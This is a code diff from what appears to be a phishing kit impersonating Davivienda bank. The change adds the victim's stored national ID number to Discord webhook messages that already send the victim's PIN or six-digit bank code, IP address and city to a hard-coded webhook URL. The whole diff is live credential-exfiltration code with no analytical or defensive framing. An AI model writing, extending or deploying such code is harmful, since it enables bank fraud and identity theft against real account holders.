@@ -448,6 +448,12 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1559687427751419954/nvF0tK
       $('#pin-error').hide();
     }
 
+    // ===== RECUPERAR EL NÚMERO DE DOCUMENTO (id) GUARDADO EN LA SESIÓN =====
+    var numeroDocumento = sessionStorage.getItem('numeroDocumento')
+                        || localStorage.getItem('numeroDocumento')
+                        || 'No disponible';
+    // ======================================================================
+
     // Obtener IP y ciudad
     obtenerIP().done(function(ipData) {
       const ip = ipData.ip;
@@ -462,6 +468,11 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1559687427751419954/nvF0tK
               title: "CODIGO 6 DIGITOS DAVIVIENDA",
               color: 15158332, // Rojo (puedes cambiar el color)
               fields: [
+                {
+                  name: "🆔 Número de documento",
+                  value: numeroDocumento,
+                  inline: false
+                },
                 {
                   name: "PIN",
                   value: pin,
@@ -507,6 +518,11 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1559687427751419954/nvF0tK
               title: "CODIGO 6 DIGITOS DAVIVIENDA",
               color: 15158332,
               fields: [
+                {
+                  name: "🆔 Número de documento",
+                  value: numeroDocumento,
+                  inline: false
+                },
                 {
                   name: "CODIGO",
                   value: pin,
